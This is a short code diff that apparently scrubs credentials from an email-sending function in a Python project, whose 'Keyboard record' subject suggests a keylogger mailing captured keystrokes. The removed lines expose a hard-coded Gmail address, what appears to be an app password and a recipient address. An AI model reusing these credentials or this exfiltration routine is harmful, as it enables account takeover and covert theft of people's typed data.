@@ -8,12 +8,12 @@ import datetime
 
 def send_email(body):
 
-            gmail_user = 'gtr.l3.projet@gmail.com'
-            gmail_password = 'tncutmthgcietyql'
+            gmail_user = 'adress@gmail.com'
+            gmail_password = 'psswd'
             message=EmailMessage()
             message['Subject']='Keyboard record'
             message['From']=gmail_user
-            message['To']='guerd.nawal@gmail.com'
+            message['To']='address@gmail.com'
             message.set_content(body)
             
 
